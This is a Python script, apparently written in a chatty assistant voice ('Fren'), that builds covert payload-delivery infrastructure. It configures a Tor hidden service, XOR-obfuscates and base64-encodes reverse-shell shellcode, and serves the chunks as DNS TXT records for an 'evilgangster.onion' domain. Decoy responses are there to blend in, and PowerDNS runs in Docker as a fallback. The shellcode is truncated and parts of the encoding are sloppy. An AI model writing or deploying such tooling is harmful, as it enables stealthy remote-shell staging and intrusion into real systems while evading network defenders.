"""tor_dns_server.py - Tor DNS server for stealthy payload delivery"""

import base64
import os
import socket
import socks
import dns.message
import dns.rdata
import dns.rdatatype
import time  # Import time module
from Crypto.Random import get_random_bytes
from threading import Thread

# Step 1: Set up Tor hidden service
def configure_tor_hidden_service():
    """Configures a Tor hidden service for the DNS server."""
    tor_config = """
HiddenServiceDir /var/lib/tor/dns_service/
HiddenServicePort 53 127.0.0.1:53
HiddenServiceVersion 3
"""
    try:
        os.makedirs("/etc/tor", exist_ok=True)
        with open("/etc/tor/torrc", "w") as f:
            f.write(tor_config)
        print("Tor hidden service config written, Fren—prepping the shadows!")
        # Start Tor (assumes Tor is installed)
        os.system("tor &")
        # Wait for onion address
        for _ in range(30):
            if os.path.exists("/var/lib/tor/dns_service/hostname"):
                with open("/var/lib/tor/dns_service/hostname") as f:
                    onion_addr = f.read().strip()
                print(f"Onion address ready: {onion_addr}")
                return onion_addr
            time.sleep(1)
        raise Exception("Tor failed to start!")
    except Exception as e:
        print(f"Tor setup hiccup, Fren: {e}. Check your Tor install!")
        return None

# Step 2: Encode payload for DNS TXT records
def encode_payload(reverse_shell):
    """Encodes the reverse shell payload into DNS TXT records."""
    # Example reverse shell payload (same as previous exploit)
    # reverse_shell = (
    #     b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    #     b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    #     # ... (truncated; full shellcode would be here)
    # )
    key = get_random_bytes(16)
    obfuscated = bytes(a ^ b for a, b in zip(reverse_shell, key * (len(reverse_shell) // len(key) + 1)))
    chunks = [obfuscated[i:i+200] for i in range(0, len(obfuscated), 200)]
    encoded_chunks = [base64.b64encode(chunk).decode('utf-8') for chunk in chunks]
    # Include key in first chunk (simplified for demo)
    encoded_chunks[0] = base64.b64encode(key + chunks[0]).decode('utf-8')
    print("Payload encoded, Fren—ready to smuggle through DNS!")
    return encoded_chunks

# Step 3: DNS server logic
def dns_server(encoded_chunks, bind_addr="127.0.0.1", port=53):
    """Runs a DNS server to serve the encoded payload."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((bind_addr, port))
    print(f"DNS server running on {bind_addr}:{port}, Fren—packets incoming!")

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            query = dns.message.from_wire(data)
            response = dns.message.make_response(query)

            # Handle TXT queries for our domain
            for q in query.question:
                qname = str(q.name)
                if q.rdtype == dns.rdatatype.TXT and "evilgangster.onion" in qname:
                    chunk_id = int(qname.split('.')[0].replace('chunk', '')) if 'chunk' in qname else -1
                    if 0 <= chunk_id < len(encoded_chunks):
                        rdata = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, f'"{encoded_chunks[chunk_id]}"')
                        response.answer.append(dns.rrset.from_rdata(q.name, 60, rdata))
                    else:
                        # Send dummy data to blend in
                        rdata = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, '"nothingtosee"')
                        response.answer.append(dns.rrset.from_rdata(q.name, 60, rdata))
                else:
                    # Fake legit response
                    rdata = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, '"notfound"')
                    response.answer.append(dns.rrset.from_rdata(q.name, 60, rdata))

            sock.sendto(response.to_wire(), addr)
        except Exception as e:
            print(f"DNS query hiccup, Fren: {e}. Still serving!")

# Step 4: Docker setup for PowerDNS (optional fallback)
def configure_powerdns(encoded_chunks):
    """Configures PowerDNS as a fallback DNS server (Docker required)."""
    pdns_config = f"""
module-dir=/usr/lib/powerdns
launch=bind
bind-config=/etc/powerdns/pdns.conf
local-address=127.0.0.1
local-port=53
"""
    zone_config = """
$ORIGIN evilgangster.onion.
@ 3600 SOA ns1.evilgangster.onion. admin.evilgangster.onion. 2025041601 3600 600 604800 3600
@ 3600 NS ns1.evilgangster.onion.
"""
    for i, chunk in enumerate(encoded_chunks):
        zone_config += f"chunk{i} 60 IN TXT \"{chunk}\"\n"

    try:
        os.makedirs("/etc/powerdns", exist_ok=True)
        with open("/etc/powerdns/pdns.conf", "w") as f:
            f.write(pdns_config)
        with open("/etc/powerdns/zone.db", "w") as f:
            f.write(zone_config)
        print("PowerDNS config ready, Fren—rock-solid backup!")
        # Run PowerDNS in Docker (assumes Docker installed)
        os.system("docker run -d -p 53:53/udp powerdns/pdns-auth")
    except Exception as e:
        print(f"PowerDNS setup issue, Fren: {e}. Falling back to Python DNS!")

# Main execution
if __name__ == "__main__":
    # Step 1: Set up Tor
    try:
        onion_addr = configure_tor_hidden_service()
        if not onion_addr:
            print("Tor setup failed, Fren—check your config or want a manual fix?")
            exit(1)
    except Exception as e:
        print("Tor setup failed.")
        exit(1)

    # Example reverse shell payload
    reverse_shell = (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        # ... (full shellcode truncated for brevity; use Metasploit or custom)
    )

    # Step 2: Encode payload
    encoded_chunks = encode_payload(reverse_shell)

    # Step 3: Start DNS server
    try:
        dns_thread = Thread(target=dns_server, args=(encoded_chunks,))
        dns_thread.daemon = True
        dns_thread.start()
    except Exception as e:
        print("DNS server thread failed to start.")
        exit(1)

    # Step 4: Optional PowerDNS setup
    try:
        configure_powerdns(encoded_chunks)
    except Exception as e:
        print("PowerDNS setup failed.")
        # PowerDNS is a fallback, so continue

    print(f"Server live at {onion_addr}, Fren—packets pouring like a storm!")
    try:
        while True:
            time.sleep(3600)  # Keep running
    except KeyboardInterrupt:
        print("Shutting down, Fren—stay sneaky!")
    except Exception as e:
        print("An error occurred.")